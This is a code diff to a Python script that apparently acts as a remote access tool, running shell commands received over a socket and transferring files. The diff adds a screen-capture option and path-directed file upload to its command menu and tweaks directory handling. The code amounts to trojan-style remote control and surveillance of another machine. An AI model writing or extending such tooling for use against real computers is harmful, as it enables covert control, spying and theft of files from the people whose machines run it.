@@ -1,3 +1,4 @@
+from socket import socket
 import subprocess
 import os
 
@@ -21,7 +22,7 @@ def handleConnection(my_socket):
                 c = command.split()
                 if(c[0].lower() == "cd"):
                     print("changing path")
-                    if(os.path.exists(c[1])):
+                    if(c[1] != '' and os.path.exists(c[1])):
                         os.chdir(c[1])
                     continue
 
@@ -45,8 +46,15 @@ def handleConnection(my_socket):
             my_socket.download_file()
 
         elif (user_input == "3"):
+            print("waiting for path...")
+            path = my_socket.recieve_data()
+            print("Navigating to " , path)
+        
 
-            my_socket.upload_file()
+            my_socket.upload_file(path)
+        elif(user_input == '4'):
+            my_socket.capture_screen()
+
             
 
             
